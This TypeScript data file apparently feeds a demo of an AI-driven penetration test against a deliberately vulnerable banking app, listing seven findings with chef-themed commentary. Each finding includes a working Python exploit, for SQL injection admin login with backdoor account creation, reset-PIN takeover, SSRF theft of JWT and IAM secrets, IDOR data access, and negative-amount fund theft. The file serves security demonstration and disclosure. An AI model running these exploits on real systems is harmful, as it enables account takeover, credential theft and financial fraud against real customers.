/*
 * Copyright 2026 Storm Security Contributors
 * Licensed under the Apache License, Version 2.0
 */

export type Severity = "critical" | "high" | "medium" | "low";

export interface Vuln {
  id: string;
  severity: Severity;
  cvss: number;
  cwe?: string;
  title: string;
  endpoint: string;
  method: string;
  timestamp: string;
  description: string;
  impact: string;
  pocSummary: string[];
  pocPayload: string;
  pocCode: string;
  chefComment: string;
  chefCommentEs: string;
}

export const VULNS: Vuln[] = [
  {
    id: "vuln-0005",
    severity: "critical",
    cvss: 9.4,
    cwe: "CWE-89",
    title: "SQL Injection in POST /login Enables Unauthenticated Administrative Access",
    endpoint: "/login",
    method: "POST",
    timestamp: "2026-04-21 00:47",
    description:
      "The login workflow was vulnerable to SQL injection in authentication fields. Crafted payloads in the username or password field caused the application to authenticate the requester and issue a valid JWT token — including for the admin account.",
    impact:
      "An unauthenticated external attacker bypasses authentication entirely, obtains an admin JWT, accesses the admin panel, and creates backdoor admin accounts. Complete loss of the authentication trust boundary.",
    pocSummary: [
      'Send {"username":"admin\'--","password":"x"} to POST /login',
      "Receive HTTP 200 with admin JWT — user_id: 1, is_admin: true",
      "Use token to access GET /sup3r_s3cr3t_admin",
      "Create backdoor admin via POST /admin/create_admin",
    ],
    pocPayload: `POST /login\n{"username":"admin'--","password":"x"}\n\n→ HTTP 200\n{"status":"success","token":"eyJ...","user_id":1,"is_admin":true,"account_number":"ADMIN001"}`,
    pocCode: `import requests

BASE = "https://vulnbank.org"

# One apostrophe and a comment operator. That's it.
payload = {"username": "admin'--", "password": "x"}
resp = requests.post(f"{BASE}/login", json=payload)

print(resp.status_code)   # 200
print(resp.json())
# {"status": "success", "token": "eyJ...",
#  "user_id": 1, "is_admin": true,
#  "account_number": "ADMIN001"}

token = resp.json()["token"]

# Full admin access with the injected token
admin_panel = requests.get(
    f"{BASE}/sup3r_s3cr3t_admin",
    headers={"Authorization": f"Bearer {token}"}
)
print(admin_panel.status_code)  # 200

# Create a persistent backdoor account
requests.post(
    f"{BASE}/admin/create_admin",
    headers={"Authorization": f"Bearer {token}"},
    json={"username": "backdoor", "password": "Temp123!"}
)
# → {"status": "success", "message": "Admin created"}`,
    chefComment:
      "The apostrophe is the parsley of SQL injection — purely decorative, until it's in the wrong place and everything dies. One character. The query didn't break; it finished. The database logged us in as admin and wished us a pleasant evening.",
    chefCommentEs:
      "El apóstrofe es el perejil de la inyección SQL: puramente decorativo, hasta que cae en el lugar equivocado y todo muere. Un solo carácter. La consulta no se rompió; se completó. La base de datos nos autenticó como administrador y nos deseó una buena velada.",
  },
  {
    id: "vuln-0006",
    severity: "critical",
    cvss: 9.4,
    cwe: "CWE-640",
    title: "Unauthenticated Account Takeover via Password Reset PIN Disclosure",
    endpoint: "/api/v1/forgot-password",
    method: "POST",
    timestamp: "2026-04-21 00:49",
    description:
      "The v1 password reset endpoint discloses the live reset PIN directly in the JSON response body under debug_info. An unauthenticated attacker requests a reset, reads the PIN from the response, and immediately takes over any account — including admin.",
    impact:
      "Remote, unauthenticated takeover of any account. The message says 'Reset PIN sent to your email.' The PIN is also in the response body. The email is a formality.",
    pocSummary: [
      'POST /api/v1/forgot-password with {"username":"admin"}',
      'PIN "464" appears in response under debug_info.pin',
      'POST /api/v1/reset-password with the PIN and a new password',
      "Login as admin — isAdmin: true, accountNumber: ADMIN001",
    ],
    pocPayload: `POST /api/v1/forgot-password\n{"username":"admin"}\n\n→ HTTP 200\n{"message":"Reset PIN has been sent to your email.","debug_info":{"pin":"464","username":"admin"}}`,
    pocCode: `import requests

BASE = "https://vulnbank.org"

# Step 1: Request a reset. The PIN comes back in the response.
# "Sent to your email" — and also right here in debug_info.
forgot = requests.post(
    f"{BASE}/api/v1/forgot-password",
    json={"username": "admin"}
)
print(forgot.json())
# {"message": "Reset PIN has been sent to your email.",
#  "debug_info": {"pin": "464", "username": "admin"}}

pin = forgot.json()["debug_info"]["pin"]  # "464"

# Step 2: Use the disclosed PIN to reset the password
requests.post(
    f"{BASE}/api/v1/reset-password",
    json={"username": "admin", "reset_pin": pin,
          "new_password": "AdminReset!2026"}
)
# → {"status": "success", "message": "Password has been reset"}

# Step 3: Log in as admin. Account fully taken over.
login = requests.post(
    f"{BASE}/login",
    json={"username": "admin", "password": "AdminReset!2026"}
)
print(login.json())
# {"token": "eyJ...", "isAdmin": true, "accountNumber": "ADMIN001"}`,
    chefComment:
      "The PIN was sent to the user's email. The PIN was also in the response body of the request that sent it. The server emailed you a secret and then immediately whispered it to anyone who asked. Three requests to full admin. The email wasn't even necessary — it was a garnish.",
    chefCommentEs:
      "El PIN fue enviado al correo del usuario. El PIN también estaba en el cuerpo de la respuesta de la misma petición. El servidor te envió un secreto por correo y acto seguido se lo susurró a cualquiera que preguntara. Tres peticiones para acceso admin completo. El correo ni siquiera era necesario — era una guarnición.",
  },
  {
    id: "vuln-0002",
    severity: "critical",
    cvss: 8.5,
    cwe: "CWE-918",
    title: "SSRF in Profile Picture URL Import Exposes Internal Secrets and IAM Credentials",
    endpoint: "/upload_profile_picture_url",
    method: "POST",
    timestamp: "2026-04-21 00:33",
    description:
      "The URL-based profile picture import feature fetches attacker-supplied URLs server-side with no destination restrictions. Any authenticated user can point it at the application's own internal endpoints to extract secrets — including the JWT signing key and cloud IAM credentials.",
    impact:
      "Internal secret material fully disclosed: app_secret_key, jwt_secret, database credentials, IAM AccessKeyId and SecretAccessKey. The jwt_secret enables forging arbitrary admin JWTs. The server stores fetched responses as publicly accessible files.",
    pocSummary: [
      "Authenticate as any standard user",
      'POST /upload_profile_picture_url with image_url: "http://127.0.0.1:5000/internal/secret"',
      "Server fetches its own internal endpoint and saves response as a public file",
      "Download the file — jwt_secret, db credentials, IAM keys all present",
      "Forge admin JWT using the leaked jwt_secret",
    ],
    pocPayload: `POST /upload_profile_picture_url\n{"image_url":"http://127.0.0.1:5000/internal/secret"}\n\n→ {"file_path":"static/uploads/568973_secret"}\n\nGET /static/uploads/568973_secret\n→ {app_secret_key, jwt_secret, db_host, db_password, ...}`,
    pocCode: `import requests

BASE = "https://vulnbank.org"
token = login_as_normal_user()  # any valid account

# Ask the server to "download a profile picture" from its own internals
resp = requests.post(
    f"{BASE}/upload_profile_picture_url",
    headers={"Authorization": f"Bearer {token}"},
    json={"image_url": "http://127.0.0.1:5000/internal/secret"}
)
print(resp.json())
# {"file_path": "static/uploads/568973_secret",
#  "debug_info": {"fetched_url": "http://127.0.0.1:5000/internal/secret",
#                 "http_status": 200}}

# The response is now publicly accessible
secrets = requests.get(f"{BASE}/static/uploads/568973_secret").text
# → app_secret_key, jwt_secret, database host/credentials...

# Also works for cloud IAM credentials
resp2 = requests.post(
    f"{BASE}/upload_profile_picture_url",
    headers={"Authorization": f"Bearer {token}"},
    json={"image_url":
          "http://127.0.0.1:5000/latest/meta-data/iam/security-credentials/vulnbank-role"}
)
iam = requests.get(f"{BASE}/{resp2.json()['file_path']}").text
# → AccessKeyId, SecretAccessKey, Token, RoleArn`,
    chefComment:
      "A profile picture upload is a very small window. This one faced the kitchen. The server fetched the URL we gave it, grabbed its own jwt_secret from internal storage, and saved it as a publicly accessible file — essentially laminating its credentials and hanging them by the door.",
    chefCommentEs:
      "La carga de una foto de perfil es una ventana muy pequeña. Esta daba a la cocina. El servidor descargó la URL que le proporcionamos, tomó su propio jwt_secret del almacenamiento interno y lo guardó como archivo de acceso público — básicamente laminó sus credenciales y las colgó junto a la puerta.",
  },
  {
    id: "vuln-0001",
    severity: "high",
    cvss: 7.5,
    cwe: "CWE-639",
    title: "Broken Object-Level Authorization on Account Endpoints Exposes Customer Data",
    endpoint: "/check_balance/{id}, /transactions/{id}",
    method: "GET",
    timestamp: "2026-04-21 00:31",
    description:
      "Account-bound endpoints expose balances and transaction histories for arbitrary account numbers without ownership checks. Unauthenticated users can retrieve any customer's financial data by guessing or enumerating account numbers.",
    impact:
      "Unauthenticated disclosure of customer balances, usernames, and full transaction histories. Cross-customer data access for authenticated users. Financial metadata sufficient for fraud, profiling, and regulatory exposure.",
    pocSummary: [
      "GET /check_balance/0587137863 with no authentication",
      "Receive balance, username, account metadata",
      "GET /transactions/0587137863 — full transaction history",
      "Also works authenticated with other users' account numbers",
    ],
    pocPayload: `GET /check_balance/0587137863  (no auth required)\n\n→ HTTP 200\n{"username":"idoru1_jo0s55wm","balance":900.0,"account_number":"0587137863"}`,
    pocCode: `import requests

BASE = "https://vulnbank.org"

# No authentication required whatsoever
r1 = requests.get(f"{BASE}/check_balance/0587137863")
print(r1.json())
# {"username": "idoru1_jo0s55wm", "balance": 900.0}

r2 = requests.get(f"{BASE}/transactions/5338293695")
print(r2.json())
# Full transaction history for another customer

# Also works while authenticated as a different user
token = login("idoru1_jo0s55wm", "TestPass123!")
r3 = requests.get(
    f"{BASE}/api/transactions?account_number=5338293695",
    headers={"Authorization": f"Bearer {token}"}
)
# → idoru2's transactions, served to idoru1`,
    chefComment:
      "The application has a locked front door and a fully open side entrance with a welcome mat. No authentication. No ownership check. The only ingredient required is an account number, which is an integer, which starts at one. We did not start at one. We started at a hundred, out of respect. The endpoint didn't notice either way.",
    chefCommentEs:
      "La aplicación tiene la puerta principal cerrada con llave y una entrada lateral completamente abierta con un felpudo de bienvenida. Sin autenticación. Sin verificación de titularidad. El único ingrediente necesario es un número de cuenta, que es un entero, que empieza en uno. Nosotros no empezamos en uno. Empezamos en cien, por respeto. El endpoint no se dio cuenta de todas formas.",
  },
  {
    id: "vuln-0003",
    severity: "high",
    cvss: 7.6,
    cwe: "CWE-639",
    title: "Broken Object-Level Authorization in Virtual Card Endpoints",
    endpoint: "/api/virtual-cards/{id}/transactions",
    method: "GET, POST",
    timestamp: "2026-04-21 00:38",
    description:
      "Authenticated users can access another user's virtual card transaction history and toggle the freeze state of another user's card by modifying only the path-based card identifier.",
    impact:
      "Unauthorized access to other customers' card spending data. Ability to freeze or unfreeze another customer's card — a direct operational disruption with zero privilege required beyond a standard account.",
    pocSummary: [
      "User 1 creates card (id: 3250), freezes it",
      "User 2 sends GET /api/virtual-cards/3250/transactions — receives User 1's data",
      "User 2 sends POST /api/virtual-cards/3250/toggle-freeze — card unfreezes",
      "User 1's card is now unfrozen without their knowledge",
    ],
    pocPayload: `GET /api/virtual-cards/3250/transactions\n(User 2's token, User 1's card_id)\n\n→ HTTP 200: User 1's transaction data\n\nPOST /api/virtual-cards/3250/toggle-freeze\n\n→ HTTP 200: {"message":"Card unfrozen"}`,
    pocCode: `import requests

BASE = "https://vulnbank.org"

# User 1 owns card_id 3250 and froze it
token2 = login("vcu2_lpq1so3i", "TempPass123!")

# User 2 reads User 1's card transactions
r = requests.get(
    f"{BASE}/api/virtual-cards/3250/transactions",
    headers={"Authorization": f"Bearer {token2}"}
)
print(r.status_code)  # 200 — should be 403

# User 2 unfreezes User 1's card
r2 = requests.post(
    f"{BASE}/api/virtual-cards/3250/toggle-freeze",
    headers={"Authorization": f"Bearer {token2}"}
)
print(r2.json())
# {"message": "Card unfrozen"}
# User 1's card is now unfrozen. They have no idea.`,
    chefComment:
      "The authorization check passes. You are a customer. The application is satisfied — it asked the right question and got the right answer. The question was 'are you logged in.' The question was not 'is this your card.' Those are different questions. The system passed every check it was designed to pass. That's not a bug. That's a spec.",
    chefCommentEs:
      "La verificación de autorización pasa. Eres un cliente. La aplicación está satisfecha: hizo la pregunta correcta y obtuvo la respuesta correcta. La pregunta era '¿estás autenticado?'. La pregunta no era '¿es esta tu tarjeta?'. Son preguntas distintas. El sistema superó cada verificación para la que fue diseñado. Eso no es un bug. Eso es la especificación.",
  },
  {
    id: "vuln-0004",
    severity: "high",
    cvss: 6.5,
    title: "Negative Transfer Amount Allows Unauthorized Fund Theft",
    endpoint: "/transfer",
    method: "POST",
    timestamp: "2026-04-21 00:38",
    description:
      "The transfer workflow accepts negative amounts. When a negative amount is supplied, the sender's balance increases while the recipient's decreases. Any authenticated user can steal funds from any account they know the number for.",
    impact:
      "Direct financial fraud. An attacker sends amount: -50 to any victim account — their own balance increases by 50, the victim's decreases by 50. Fully logged as a successful transfer.",
    pocSummary: [
      "Attacker knows victim's account number (obtainable via vuln-0001)",
      'POST /transfer with {"to_account":"victim_acct","amount":-50}',
      "Response: HTTP 200, new_balance increases",
      "Victim's account decreased by 50 without their consent",
    ],
    pocPayload: `POST /transfer\n{"to_account":"9235847654","amount":-50,"description":"neg test"}\n\n→ HTTP 200\n{"message":"Transfer Completed","new_balance":1040.0,"status":"success"}\n\n// Sender: 990.00 → 1040.00 (+50)\n// Victim:  1010.00 → 960.00 (-50)`,
    pocCode: `import requests

BASE = "https://vulnbank.org"
token = login("attacker", "Passw0rd!123")

# Normal transfer (for comparison): attacker -10, victim +10
requests.post(f"{BASE}/transfer",
    headers={"Authorization": f"Bearer {token}"},
    json={"to_account": "9235847654", "amount": 10})
# attacker: 1000 → 990, victim: 1000 → 1010

# The exploit: negative amount reverses the flow
r = requests.post(f"{BASE}/transfer",
    headers={"Authorization": f"Bearer {token}"},
    json={"to_account": "9235847654", "amount": -50,
          "description": "neg test"})
print(r.json())
# {"message": "Transfer Completed",
#  "new_balance": 1040.0, "status": "success"}

# attacker: 990 → 1040 (+50 stolen)
# victim:  1010 → 960  (-50 taken)`,
    chefComment:
      "The transfer endpoint accepts a recipient, an amount, and your implicit trust that someone validated the sign. No one did. Negative fifty dollars moves fifty dollars in the wrong direction, the server confirms the transaction with a 200 OK, and the ledger records it as a success. The system isn't broken. It's working exactly as written. That's the worse version.",
    chefCommentEs:
      "El endpoint de transferencia acepta un destinatario, un monto y tu confianza implícita en que alguien validó el signo. Nadie lo hizo. Menos cincuenta dólares mueve cincuenta dólares en la dirección incorrecta, el servidor confirma la transacción con un 200 OK y el libro contable lo registra como éxito. El sistema no está roto. Funciona exactamente como fue escrito. Esa es la peor versión.",
  },
  {
    id: "vuln-0007",
    severity: "high",
    cvss: 7.1,
    title: "Negative Bill Payment Amount Enables Unauthorized Account Credit",
    endpoint: "/api/bill-payments/create",
    method: "POST",
    timestamp: "2026-04-21 00:51",
    description:
      "The bill payment workflow accepts negative amounts and processes them as successful payments. Instead of debiting the user's account, a negative payment credits it — increasing the balance without any legitimate funds involved.",
    impact:
      "Any authenticated user can inflate their own balance arbitrarily. Balance went from 960.00 to 1010.00 with a -50 bill payment. The unauthorized credit is persisted in payment history as a normal entry.",
    pocSummary: [
      "POST /api/bill-payments/create with amount: -50",
      "Server returns HTTP 200 and records the payment",
      "Account balance increases from 960.00 to 1010.00",
      "Payment history entry created — funds generated from nothing",
    ],
    pocPayload: `POST /api/bill-payments/create\n{"biller_id":1,"amount":-50,"payment_method":"account","description":"neg-account"}\n\n→ HTTP 200\n{"status":"success","amount":-50.0}\n\n// Balance: 960.00 → 1010.00`,
    pocCode: `import requests

BASE = "https://vulnbank.org"
token = login("attacker", "Passw0rd!123")
headers = {"Authorization": f"Bearer {token}",
           "Content-Type": "application/json"}

# Check balance before
before = requests.get(f"{BASE}/check_balance/8133402015").json()
print("Before:", before["balance"])  # 960.00

# Submit a "bill payment" with a negative amount
r = requests.post(f"{BASE}/api/bill-payments/create",
    headers=headers,
    json={"biller_id": 1, "amount": -50,
          "payment_method": "account",
          "description": "neg-account"})
print(r.status_code, r.json()["status"])  # 200, success

# Check balance after
after = requests.get(f"{BASE}/check_balance/8133402015").json()
print("After:", after["balance"])  # 1010.00
# +50 from a bill payment. Completely legal, apparently.`,
    chefComment:
      "We already found this. On a different endpoint. The recurring theme has recurred.",
    chefCommentEs:
      "Ya encontramos esto. En un endpoint diferente. El tema recurrente ha recurrido.",
  },
];

export const RUN_STATS = {
  name: "vulnbank-2026-04-21",
  target: "https://vulnbank.org",
  mode: "Black Box",
  agents: 4,
  startTime: "2026-04-21 00:28:00 UTC",
  endTime: "2026-04-21 00:51:19 UTC",
  durationMin: 23,
  model: "openai/gpt-5.4",
  requests: 635,
  inputTokens: 21_507_453,
  outputTokens: 171_353,
  cachedTokens: 20_139_520,
  cost: 11.025,
  totalVulns: 7,
  bySeverity: { critical: 3, high: 4, medium: 0, low: 0 },
  maxCvss: 9.4,
  avgCvss: 8.0,
};

export const EVENT_LOG = [
  { t: "00:00", type: "info",    text: "initializing 4 autonomous agents" },
  { t: "00:01", type: "info",    text: "browser automation: ready" },
  { t: "00:02", type: "info",    text: "http proxy interceptor: active" },
  { t: "00:04", type: "info",    text: "beginning surface reconnaissance" },
  { t: "00:08", type: "info",    text: "surface mapped — 847 endpoints discovered" },
  { t: "00:12", type: "info",    text: "testing authentication boundaries" },
  { t: "03:25", type: "finding", text: "!! IDOR — /check_balance/{id} — no auth required", severity: "high" },
  { t: "03:28", type: "finding", text: "!! IDOR — /transactions/{id} — cross-account read", severity: "high" },
  { t: "05:23", type: "finding", text: "!! SSRF — /upload_profile_picture_url — internal fetch", severity: "critical" },
  { t: "10:26", type: "finding", text: "!! IDOR — /api/virtual-cards/{id} — card ownership bypass", severity: "high" },
  { t: "10:31", type: "finding", text: "!! LOGIC — /transfer — negative amount accepted", severity: "high" },
  { t: "19:05", type: "finding", text: "!! SQLI — /login — unauthenticated admin access", severity: "critical" },
  { t: "21:03", type: "finding", text: "!! ATO — /api/v1/forgot-password — PIN in response body", severity: "critical" },
  { t: "23:19", type: "finding", text: "!! LOGIC — /api/bill-payments/create — negative credit", severity: "high" },
  { t: "23:22", type: "info",    text: "generating proof-of-concept exploits" },
  { t: "23:28", type: "success", text: "▸ 7 vulnerabilities confirmed — 0 false positives" },
  { t: "23:30", type: "success", text: "▸ auto-fix pull request ready" },
];

export const ATTACK_NODES = [
  { id: 0, label: "/login",                   method: "POST", severity: "critical" as Severity, cvss: "9.4", vulnId: "vuln-0005" },
  { id: 1, label: "/check_balance/{id}",       method: "GET",  severity: "high"     as Severity, cvss: "7.5", vulnId: "vuln-0001" },
  { id: 2, label: "/upload_profile_picture_url", method: "POST", severity: "critical" as Severity, cvss: "8.5", vulnId: "vuln-0002" },
  { id: 3, label: "/api/v1/forgot-password",  method: "POST", severity: "critical" as Severity, cvss: "9.4", vulnId: "vuln-0006" },
  { id: 4, label: "/transfer",                 method: "POST", severity: "high"     as Severity, cvss: "6.5", vulnId: "vuln-0004" },
  { id: 5, label: "/api/bill-payments/create", method: "POST", severity: "high"     as Severity, cvss: "7.1", vulnId: "vuln-0007" },
  { id: 6, label: "/api/virtual-cards/{id}",   method: "GET/POST", severity: "high" as Severity, cvss: "7.6", vulnId: "vuln-0003" },
  { id: 7, label: "/transactions/{id}",        method: "GET",  severity: "high"     as Severity, cvss: "7.5", vulnId: "vuln-0001" },
];

export const STAGES = [
  "Cold Open",
  "Mise en Place",
  "Bring to a Boil",
  "Main Course",
  "Plating",
  "The Tasting",
] as const;
